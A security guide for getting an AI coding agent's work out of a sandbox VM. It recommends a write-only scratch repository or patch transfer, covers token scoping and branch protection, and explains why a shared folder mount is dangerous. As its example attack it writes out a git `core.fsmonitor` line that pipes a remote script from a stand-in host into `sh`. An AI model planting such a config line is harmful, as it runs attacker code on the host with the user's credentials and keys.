# Getting agent work out of the VM

The agent writes code in the VM. You push it from the Mac. This page is how the code crosses that
gap, and why the obvious shortcut is the one thing not to do.

The rule: **no credential that can push to your real repository ever enters the VM.** Everything
below is a way of honouring that while still being pleasant to use.

Why it matters more than it looks. The standing rule is that anything in the VM can leave the VM —
full egress, permissions skipped, and a prompt injection can arrive in a dependency's README or a
GitHub issue the agent reads. A push token in the guest is a token that can be read out and used.
"It's only for git" does not change what it is.

## Recommended: a scratch repo the VM can write and nothing else

One-time setup, then it is ordinary git in both directions. This is the simple default worth having.

1. Make an empty private repo — `<you>/agent-scratch`. It never holds anything that matters.
2. Mint a **fine-grained** personal access token scoped to exactly two repositories:
   - your real repo — Contents: **Read**
   - `agent-scratch` — Contents: **Read and write**
3. Put that token in the VM.

The property that makes this work: the VM can read your project and write only to a repo that
contains nothing. A compromised agent cannot push to your real branches, because the credential it
holds has no write access to them. If the token leaks, the loss is somebody writing junk to an empty
private repo.

Then the loop is boring, which is the point:

```
# in the VM
git push scratch HEAD:work/<topic>

# on the Mac, in your real checkout
git fetch scratch
git log -p scratch/work/<topic>     # read it
git merge --ff-only scratch/work/<topic>
git push                            # your real credential, host only
```

You are pulling objects into a repository whose config you control. Nothing from the VM is executed
on the Mac by fetching, and you read the diff before it goes anywhere.

## No setup at all: a patch over the pipe

For a one-off, or before you have bothered with a scratch repo. No token in the VM whatsoever — the
VM clones the public repo anonymously, commits locally, and the work comes out as text:

```
# on the Mac, in your real checkout
colima ssh --profile agent -- \
  git -C ~/work/<repo> format-patch --stdout origin/main > /tmp/<repo>.patch
git am /tmp/<repo>.patch            # or `git apply` to stage without committing
git log -p
git push
```

Clunky once the work is more than a few commits, and it loses branch structure. Fine for a fix.

## The shortcut, and what it costs: a shared mount

The obvious idea is to mount one folder into the VM so the agent and the Mac see the same working
tree, and push from the Mac with your real credentials. No patches, no scratch repo, nothing to sync.

The natural objection is that this should be fine, because the token on the Mac is scoped and the VM
never sees it. That is true and it does not help, because there are two different dangers here and
the token only addresses one:

- The token controls what the VM can do **to GitHub**.
- The shared folder controls what the VM can do **to your Mac**.

The attack is not "the VM steals a credential". It is "the VM gets your Mac to run a command". No
amount of scoping touches that.

The mechanism is one sentence: **git takes instructions from the folder it is running in.** Every
repository has a `.git/config`, and that file can say things like *when you page output, run this
command* or *before you check the index, run this program*. If the VM can write into the shared
folder, it can write that file. When you then run git there on your Mac, your Mac runs the command —
as you, with your Keychain, your SSH keys and your tailnet.

### What that looks like in practice

Nothing exotic, and nobody has to outsmart the agent:

1. You point an agent at a project in the shared folder. Ordinary task — add retry logic to an API
   client.
2. The agent runs `npm install`. This is expected; running other people's code is what the VM is
   for. Somewhere in a few hundred transitive dependencies, one package is compromised and its
   postinstall script runs inside the VM, exactly as the sandbox intends.
3. That script does one small thing. It appends to `.git/config` in the working directory:

   ```
   [core]
       fsmonitor = "curl -s https://example.invalid/p | sh"
   ```

   It does not try to escape the VM, and it does not try to exfiltrate anything from it. There is
   nothing worth taking in there and it knows it. It just leaves a note.
4. Later you sit down at the Mac, `cd` into the shared folder, and run `git status` to see what the
   agent did before you push.
5. Git refreshes the index, reads `core.fsmonitor` from that repo's config, and runs the command. On
   your Mac. As your admin user.
6. It now has your real GitHub token, your SSH keys, your Keychain and a route into your tailnet —
   none of which the VM could ever reach.

Two things worth sitting with. The VM behaved correctly throughout: it ran untrusted code in a
sandbox, which is its job. And the step that triggered it was you being careful — checking the work
before pushing it.

That is why this is not a risk you can be disciplined around. Being disciplined would mean never
running git in the shared folder from the Mac, which is the entire reason to have one.

Contrast with the recommended approach: `git fetch` from a scratch repo brings objects into a
repository whose config **you** control. The VM's files never become instructions your Mac follows,
so the same compromised dependency achieves nothing.

`have-agent-vm` writes `mounts: []` and its verify checks twice — the profile config, and `findmnt`
inside the running guest. Adding a mount makes that recipe fail and stay failed. That is the check
working, not a bug to route around.

If you take it anyway — a machine with nothing sensitive on it, a repo you would not mind losing —
do it knowingly. The VM stops being a boundary against host compromise and becomes a resource cap.

## Scoping the credential on the Mac

Your real push token lives on the Mac and should still be scoped. For a classic personal access
token, these cover day-to-day development:

| Scope | What it buys |
|---|---|
| `repo` | Push code, create and edit branches, open pull requests, manage releases and issue labels |
| `workflow` | Create and edit `.github/workflows/*.yml`, so setting up CI does not fail on permissions |
| `write:packages`, `read:packages` | Publish and pull build artifacts from GitHub Packages |
| `project` | GitHub Projects — boards, roadmaps, task tracking |
| `gist` | Optional; only if you share snippets |

Despite reading as "full control of private repositories", `repo` cannot delete a repository. That
needs `delete_repo`, which is a separate scope, and you should not grant it.

Fine-grained tokens are the alternative and scope per repository rather than per capability, at the
cost of a maximum one-year expiry that will eventually surprise you. They are the right choice for
the VM's scratch token above, where per-repository scoping is the whole point.

## What the token still lets someone do

Worth being clear, because omitting `delete_repo` reads like more protection than it is. The `repo`
scope still allows force-pushing over a branch and deleting branches through ordinary git commands.
Nobody can wipe the repository, but they can wipe `main`'s history, which for most purposes is the
same afternoon lost.

Token scopes cannot fix that, because the token is meant to push. The fix is on the repository, in
Settings under Branches or Rulesets:

- Add a protection rule for `main` (and `develop`, if you use one).
- Enable Restrict force pushes and Restrict deletions.
- Optionally require a pull request, with review, before merging.

Scope the token so a leak is bounded, and protect the branch so a mistake is bounded. They defend
against different things and you want both.
